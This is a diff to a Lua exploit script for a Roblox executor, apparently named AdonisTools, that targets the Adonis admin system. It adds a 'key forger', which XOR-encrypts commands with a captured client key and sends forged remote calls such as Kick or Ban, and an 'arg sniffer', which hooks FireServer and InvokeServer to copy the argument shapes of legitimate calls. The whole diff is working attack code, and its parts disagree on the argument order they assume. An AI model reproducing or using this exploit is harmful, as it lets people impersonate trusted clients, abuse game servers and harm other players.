@@ -914,81 +914,324 @@ end)
 
 -- ─────────────────────────────────────────────────────────────
 --  SECTION 11 — KEY FORGER
---  Once the key is captured we can call adonis.Remote.Get and
---  adonis.Remote.Fire directly to make the server think we are
---  a legitimate Adonis client making a request.
---  adonis.Remote.Get(cmd, ...)  → invoke server, get return
---  adonis.Remote.Fire(cmd, ...) → fire and forget
+--  Correct wire format from Remote source:
+--    Fire → FireServer(  {Mode="Fire",Module,Loader,Sent,Received}, NewEncrypt(cmd,key), ...args)
+--    Get  → InvokeServer({Mode="Get", Module,Loader,Sent,Received}, NewEncrypt(cmd,key), ...args)
+--  NewEncrypt = XOR each byte of cmd with cycling key bytes
 -- ─────────────────────────────────────────────────────────────
-local kfCard = Card("🔑  key forger  /  remote caller")
-Lbl(kfCard,"craft arbitrary Adonis remote calls using the captured key",Color3.fromRGB(110,110,110),1)
+local kfCard = Card("🔑  key forger  /  raw remote caller")
+Lbl(kfCard,"correct wire format: XOR-encrypted cmd + metadata header",Color3.fromRGB(110,110,110),1)
 
-local kfCmdBox  = InputBox(kfCard,"command / key  e.g.  GetPlayers   Ban   Kick",2)
-local kfArgsBox = InputBox(kfCard,"args (comma-separated)  e.g.  Player1, reason",3)
+local kfCmdBox  = InputBox(kfCard,"command  e.g.  GetPlayers   Kick   Ban   Hint",2)
+local kfArgsBox = InputBox(kfCard,"args (comma-separated)  e.g.  Player1, bad behaviour",3)
 
-local kfGetBtn  = Btn(kfCard,"▶ Remote.Get  (invoke + await return)", Color3.fromRGB(28,45,55),4)
-local kfFireBtn = Btn(kfCard,"▶ Remote.Fire (fire and forget)",        Color3.fromRGB(40,28,55),5)
-local kfAppend, kfClear = LogBox(kfCard,80,6)
+local kfModeBar = Instance.new("Frame",kfCard)
+kfModeBar.Size=UDim2.new(1,0,0,22) kfModeBar.BackgroundColor3=Color3.fromRGB(18,18,28)
+kfModeBar.BorderSizePixel=0 kfModeBar.LayoutOrder=4
+Instance.new("UICorner",kfModeBar).CornerRadius=UDim.new(0,3)
+local kfModeLL=Instance.new("UIListLayout",kfModeBar)
+kfModeLL.FillDirection=Enum.FillDirection.Horizontal
+kfModeLL.Padding=UDim.new(0,2) kfModeLL.SortOrder=Enum.SortOrder.LayoutOrder
+
+local kfMode="Fire"
+local kfModeBtns={}
+for i,pair in ipairs({{"Fire","Fire  (Send)"},{"Get","Get  (Invoke)"}}) do
+    local mkey,mlbl=pair[1],pair[2]
+    local b=Instance.new("TextButton",kfModeBar)
+    b.Size=UDim2.new(0.5,-2,1,-4) b.LayoutOrder=i
+    b.BackgroundColor3=(mkey=="Fire") and Color3.fromRGB(55,35,85) or Color3.fromRGB(28,28,40)
+    b.Text=mlbl b.TextColor3=Color3.fromRGB(195,195,215)
+    b.TextSize=9 b.Font=Enum.Font.Code b.BorderSizePixel=0
+    Instance.new("UICorner",b).CornerRadius=UDim.new(0,3)
+    kfModeBtns[mkey]=b
+    b.MouseButton1Click:Connect(function()
+        kfMode=mkey
+        for n,tb in pairs(kfModeBtns) do
+            tb.BackgroundColor3=(n==mkey) and Color3.fromRGB(55,35,85) or Color3.fromRGB(28,28,40)
+        end
+    end)
+end
+
+local kfSendBtn=Btn(kfCard,"▶ send",Color3.fromRGB(38,48,28),5)
+local kfAppend,kfClear=LogBox(kfCard,100,6)
 Btn(kfCard,"clear",Color3.fromRGB(30,30,30),7).MouseButton1Click:Connect(kfClear)
+local kfLbl=Lbl(kfCard,"",Color3.fromRGB(140,200,140),8)
 
 local function ParseArgs(raw)
-    local args = {}
+    local args={}
     for part in raw:gmatch("[^,]+") do
-        local s = part:match("^%s*(.-)%s*$")
-        -- try to coerce to number/bool
-        if s == "true" then table.insert(args, true)
-        elseif s == "false" then table.insert(args, false)
-        elseif tonumber(s) then table.insert(args, tonumber(s))
-        elseif s ~= "" then table.insert(args, s)
+        local s=part:match("^%s*(.-)%s*$")
+        if s=="true" then table.insert(args,true)
+        elseif s=="false" then table.insert(args,false)
+        elseif tonumber(s) then table.insert(args,tonumber(s))
+        elseif s~="" then table.insert(args,s)
         end
     end
     return args
 end
 
-kfGetBtn.MouseButton1Click:Connect(function()
-    if not adonis then kfAppend("not linked",Color3.fromRGB(255,100,100)) return end
-    local key = State.key or rawget(adonis.Core,"Key")
-    if not key then kfAppend("key not captured yet — wait for key poll or start key intercept",Color3.fromRGB(255,175,80)) return end
+-- NewEncrypt: XOR cipher matching Remote.NewEncrypt from source
+local _kfCache={}
+local function NewEncrypt(cmd,key)
+    if not(cmd and key) then return cmd end
+    local kc=_kfCache[key] or {}
+    _kfCache[key]=kc
+    if kc[cmd] then return kc[cmd] end
+    local wb=buffer.writeu8 local rb=buffer.readu8
+    local bxor=bit32.bxor
+    local buf=buffer.fromstring(cmd)
+    local kbuf=kc[1] or buffer.fromstring(key)
+    local klen=#key
+    for i=0,#cmd-1 do wb(buf,i,bxor(rb(buf,i),rb(kbuf,i%klen))) end
+    kc[cmd]=buffer.tostring(buf) kc[1]=kbuf
+    return kc[cmd]
+end
 
-    local cmd  = kfCmdBox.Text:gsub("%s+","")
-    if cmd=="" then kfAppend("enter a command",Color3.fromRGB(255,175,80)) return end
-    local args = ParseArgs(kfArgsBox.Text)
+-- Build the metadata header table prepended as first arg to every call
+local function BuildHeader(mode)
+    local remote=adonis and rawget(adonis,"Remote")
+    local sent=(remote and rawget(remote,"Sent") or 0)+1
+    return {
+        Mode    =mode,
+        Module  =rawget(adonis,"Module"),
+        Loader  =rawget(adonis,"Loader"),
+        Sent    =sent,
+        Received=remote and rawget(remote,"Received") or 0,
+    }
+end
 
-    kfAppend("[GET] sending: "..cmd..(#args>0 and "  args: "..table.concat(args,", ") or ""),Color3.fromRGB(130,210,255))
+-- Get raw RemoteEvent Object + __FUNCTION RemoteFunction
+local function GetRawRemotes()
+    local core=adonis and rawget(adonis,"Core")
+    local re=core and rawget(core,"RemoteEvent")
+    if re then return rawget(re,"Object"),rawget(re,"Function") end
+    for _,d in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
+        if d:IsA("RemoteEvent") and d:FindFirstChild("__FUNCTION") then
+            return d,d:FindFirstChild("__FUNCTION")
+        end
+    end
+    return nil,nil
+end
 
-    local ok,result = pcall(function()
-        -- Remote.Get forwards: key, cmd, args...
-        -- The actual call pattern from the source is Get("cmd", arg1, arg2, ...)
-        return adonis.Remote.Get(cmd, table.unpack(args))
-    end)
-    if ok then
-        local res = type(result)=="table" and "[table]" or tostring(result)
-        kfAppend("← return: "..res, Color3.fromRGB(90,235,130))
-        print("[AdonisTools] Remote.Get("..cmd..") → "..tostring(result))
-    else
-        kfAppend("← error: "..tostring(result),Color3.fromRGB(255,120,120))
+kfSendBtn.MouseButton1Click:Connect(function()
+    if not adonis then kfLbl.Text="not linked" kfLbl.TextColor3=Color3.fromRGB(255,100,100) return end
+    local key=State.key or (adonis.Core and rawget(adonis.Core,"Key"))
+    if not key then kfLbl.Text="key not captured — use key intercept first" kfLbl.TextColor3=Color3.fromRGB(255,175,80) return end
+    local cmd=kfCmdBox.Text:match("^%s*(.-)%s*$")
+    if cmd=="" then kfLbl.Text="enter a command" kfLbl.TextColor3=Color3.fromRGB(255,175,80) return end
+    local args=ParseArgs(kfArgsBox.Text)
+    local reObj,rfObj=GetRawRemotes()
+    local encCmd=NewEncrypt(cmd,key)
+    kfAppend("key:       "..tostring(key),Color3.fromRGB(255,215,80))
+    kfAppend("cmd plain: "..cmd,Color3.fromRGB(130,210,255))
+    kfAppend("cmd xor:   "..tostring(encCmd),Color3.fromRGB(195,165,255))
+    if #args>0 then
+        local p={} for i,a in ipairs(args) do p[i]=tostring(a) end
+        kfAppend("args:      "..table.concat(p,", "),Color3.fromRGB(180,200,180))
+    end
+    if kfMode=="Fire" then
+        if not reObj then kfLbl.Text="RemoteEvent not found" kfLbl.TextColor3=Color3.fromRGB(255,100,100) return end
+        local ok,err=pcall(function() reObj:FireServer(BuildHeader("Fire"),encCmd,table.unpack(args)) end)
+        if ok then
+            pcall(function() local r=rawget(adonis,"Remote") if r then r.Sent=(r.Sent or 0)+1 end end)
+            kfLbl.Text="✓ fired" kfLbl.TextColor3=Color3.fromRGB(90,235,130)
+            kfAppend("← sent ok",Color3.fromRGB(90,235,130))
+        else
+            kfLbl.Text="error" kfLbl.TextColor3=Color3.fromRGB(255,100,100)
+            kfAppend("← "..tostring(err),Color3.fromRGB(255,120,120))
+        end
+    elseif kfMode=="Get" then
+        if not rfObj then kfLbl.Text="__FUNCTION not found" kfLbl.TextColor3=Color3.fromRGB(255,100,100) return end
+        local ok,result=pcall(function() return rfObj:InvokeServer(BuildHeader("Get"),encCmd,table.unpack(args)) end)
+        if ok then
+            local res=type(result)=="table" and ("[table] "..tostring(#result).." entries") or tostring(result)
+            kfLbl.Text="✓ return received" kfLbl.TextColor3=Color3.fromRGB(90,235,130)
+            kfAppend("← "..res,Color3.fromRGB(90,235,130))
+            pcall(function() local r=rawget(adonis,"Remote") if r then r.Sent=(r.Sent or 0)+1 end end)
+            if type(result)=="table" then
+                print("[AdonisTools] Get("..cmd..") return:")
+                for k,v in pairs(result) do print("  ["..tostring(k).."] = "..tostring(v)) end
+            else
+                print("[AdonisTools] Get("..cmd..") -> "..tostring(result))
+            end
+        else
+            kfLbl.Text="error" kfLbl.TextColor3=Color3.fromRGB(255,100,100)
+            kfAppend("← "..tostring(result),Color3.fromRGB(255,120,120))
+        end
     end
 end)
 
-kfFireBtn.MouseButton1Click:Connect(function()
-    if not adonis then kfAppend("not linked",Color3.fromRGB(255,100,100)) return end
-    local key = State.key or rawget(adonis.Core,"Key")
-    if not key then kfAppend("key not captured yet",Color3.fromRGB(255,175,80)) return end
+-- ─────────────────────────────────────────────────────────────
+--  ARG SNIFFER
+--  Hooks the raw RemoteEvent:FireServer and RemoteFunction:InvokeServer
+--  and records every (key, cmd, args...) tuple that the real Adonis
+--  client sends without getting kicked. This builds a live dictionary
+--  of cmd → { argTypes, argValues } that you can paste directly into
+--  the key forger args box.
+--
+--  Why this works: legitimate Adonis calls (e.g. the client sending
+--  a chat command, or Adonis pinging the server on heartbeat) already
+--  pass the typechecker. By recording those calls we learn the exact
+--  arg shape the server expects for each command.
+-- ─────────────────────────────────────────────────────────────
+local sniffCard = Card("🕵  arg sniffer")
+Lbl(sniffCard,"records real Adonis calls so you know exactly what args each command needs",Color3.fromRGB(110,110,110),1)
 
-    local cmd  = kfCmdBox.Text:gsub("%s+","")
-    if cmd=="" then kfAppend("enter a command",Color3.fromRGB(255,175,80)) return end
-    local args = ParseArgs(kfArgsBox.Text)
+local sniffAppend, sniffClear = LogBox(sniffCard, 120, 2)
 
-    kfAppend("[FIRE] sending: "..cmd..(#args>0 and "  args: "..table.concat(args,", ") or ""),Color3.fromRGB(195,165,255))
+local sniffOnBtn  = Btn(sniffCard,"▶ start sniffing",  Color3.fromRGB(28,48,28), 3)
+local sniffOffBtn = Btn(sniffCard,"■ stop",             Color3.fromRGB(55,20,20), 4)
+local sniffFillBtn= Btn(sniffCard,"→ fill args from last selected cmd", Color3.fromRGB(38,35,55), 5)
+Btn(sniffCard,"clear",Color3.fromRGB(30,30,30),6).MouseButton1Click:Connect(sniffClear)
+local sniffLbl    = Lbl(sniffCard,"",Color3.fromRGB(140,200,140),7)
 
-    local ok,err = pcall(function()
-        adonis.Remote.Send(cmd, table.unpack(args))
-    end)
-    if ok then
-        kfAppend("← fired",Color3.fromRGB(90,235,130))
-    else
-        kfAppend("← error: "..tostring(err),Color3.fromRGB(255,120,120))
+-- dictionary: cmd → { types={}, values={} } from most recent real call
+local SniffedCmds = {}
+local lastSniffedCmd = nil
+
+-- hook handles
+local _sniffFireOrig   = nil
+local _sniffInvokeOrig = nil
+local _sniffActive     = false
+
+local function FormatArgSig(args)
+    if #args == 0 then return "(no args)" end
+    local parts = {}
+    for i,a in ipairs(args) do
+        parts[i] = typeof(a).."="..tostring(a):sub(1,30)
     end
+    return table.concat(parts, "  |  ")
+end
+
+sniffOnBtn.MouseButton1Click:Connect(function()
+    if not adonis then sniffLbl.Text="not linked" sniffLbl.TextColor3=Color3.fromRGB(255,100,100) return end
+    if _sniffActive then sniffLbl.Text="already sniffing" return end
+
+    local reObj, rfObj = GetRawRemotes()
+    if not reObj then sniffLbl.Text="RemoteEvent not found" sniffLbl.TextColor3=Color3.fromRGB(255,100,100) return end
+
+    -- Hook FireServer
+    -- The real call signature from Adonis is: FireServer(self, key, cmd, args...)
+    -- where self is the RemoteEvent. We hook the method on the instance's class
+    -- via hookfunction on the C function.
+    local fireOk, fireErr = pcall(function()
+        _sniffFireOrig = hookfn(reObj.FireServer, newcc(function(self, ...)
+            local allArgs = {...}
+            -- allArgs[1] = key, allArgs[2] = cmd, allArgs[3..] = real args
+            local sentKey = allArgs[1]
+            local cmd     = tostring(allArgs[2] or "?")
+            local realArgs = {}
+            for i=3,#allArgs do realArgs[#realArgs+1] = allArgs[i] end
+
+            -- only record calls that match our key (filter noise)
+            local myKey = State.key or rawget(adonis.Core,"Key")
+            if tostring(sentKey) == tostring(myKey) then
+                SniffedCmds[cmd] = { types={}, values={}, raw=realArgs }
+                for i,a in ipairs(realArgs) do
+                    SniffedCmds[cmd].types[i]  = typeof(a)
+                    SniffedCmds[cmd].values[i] = tostring(a)
+                end
+                lastSniffedCmd = cmd
+                local sig = FormatArgSig(realArgs)
+                sniffAppend("[FIRE] "..cmd.."  →  "..sig, Color3.fromRGB(195,165,255))
+                print("[AdonisTools] sniff FIRE "..cmd.."  "..sig)
+            end
+
+            return _sniffFireOrig(self, ...)
+        end))
+    end)
+
+    -- Hook InvokeServer
+    local invokeOk = false
+    if rfObj then
+        invokeOk = pcall(function()
+            _sniffInvokeOrig = hookfn(rfObj.InvokeServer, newcc(function(self, ...)
+                local allArgs = {...}
+                local sentKey = allArgs[1]
+                local cmd     = tostring(allArgs[2] or "?")
+                local realArgs = {}
+                for i=3,#allArgs do realArgs[#realArgs+1] = allArgs[i] end
+
+                local myKey = State.key or rawget(adonis.Core,"Key")
+                if tostring(sentKey) == tostring(myKey) then
+                    SniffedCmds[cmd] = { types={}, values={}, raw=realArgs }
+                    for i,a in ipairs(realArgs) do
+                        SniffedCmds[cmd].types[i]  = typeof(a)
+                        SniffedCmds[cmd].values[i] = tostring(a)
+                    end
+                    lastSniffedCmd = cmd
+                    local sig = FormatArgSig(realArgs)
+                    sniffAppend("[INVOKE] "..cmd.."  →  "..sig, Color3.fromRGB(130,210,255))
+                end
+
+                return _sniffInvokeOrig(self, ...)
+            end))
+        end)
+    end
+
+    if fireOk then
+        _sniffActive = true
+        sniffLbl.Text = "✓ sniffing — interact with the game to trigger real Adonis calls"
+            ..(invokeOk and "" or "  (RemoteFunction hook failed)")
+        sniffLbl.TextColor3 = Color3.fromRGB(90,235,130)
+    else
+        sniffLbl.Text = "FireServer hook failed: "..tostring(fireErr)
+        sniffLbl.TextColor3 = Color3.fromRGB(255,100,100)
+    end
+end)
+
+sniffOffBtn.MouseButton1Click:Connect(function()
+    if not _sniffActive then return end
+    local reObj, rfObj = GetRawRemotes()
+    if _sniffFireOrig and reObj then
+        pcall(hookfn, reObj.FireServer, _sniffFireOrig)
+        _sniffFireOrig = nil
+    end
+    if _sniffInvokeOrig and rfObj then
+        pcall(hookfn, rfObj.InvokeServer, _sniffInvokeOrig)
+        _sniffInvokeOrig = nil
+    end
+    _sniffActive = false
+    sniffLbl.Text = "stopped — "..tostring(#SniffedCmds ~= 0 and table.concat((function()
+        local k={} for cmd in pairs(SniffedCmds) do k[#k+1]=cmd end return k
+    end)(),", ") or "no cmds recorded")
+    sniffLbl.TextColor3 = Color3.fromRGB(200,200,200)
+end)
+
+-- fill the key forger's args box with args from a sniffed command
+sniffFillBtn.MouseButton1Click:Connect(function()
+    -- use the cmd currently typed in the key forger box, or last sniffed
+    local target = kfCmdBox.Text:match("^%s*(.-)%s*$")
+    if target == "" then target = lastSniffedCmd end
+    if not target then sniffLbl.Text="no cmd to fill — type one in the key forger box" return end
+
+    local entry = SniffedCmds[target]
+    if not entry then
+        -- list what we do have
+        local have = {}
+        for cmd in pairs(SniffedCmds) do have[#have+1] = cmd end
+        if #have == 0 then
+            sniffLbl.Text="nothing sniffed yet — start sniffing and trigger some Adonis activity"
+            sniffLbl.TextColor3=Color3.fromRGB(255,175,80)
+        else
+            sniffLbl.Text="'"..target.."' not seen yet. Recorded: "..table.concat(have,", ")
+            sniffLbl.TextColor3=Color3.fromRGB(255,175,80)
+        end
+        return
+    end
+
+    -- build the args string to paste into the key forger
+    local parts = {}
+    for i,v in ipairs(entry.values) do parts[i] = v end
+    kfArgsBox.Text = table.concat(parts, ", ")
+
+    -- also print full type signature
+    local typeSig = {}
+    for i,t in ipairs(entry.types) do typeSig[i] = t end
+    sniffLbl.Text="✓ filled from '"..target.."'  types: "..table.concat(typeSig,", ")
+    sniffLbl.TextColor3=Color3.fromRGB(90,235,130)
+    sniffAppend("→ filled forger: ["..table.concat(parts,", ").."]",Color3.fromRGB(255,215,80))
+    print("[AdonisTools] Arg signature for '"..target.."': "..table.concat(typeSig,", "))
 end)
 
 -- ─────────────────────────────────────────────────────────────
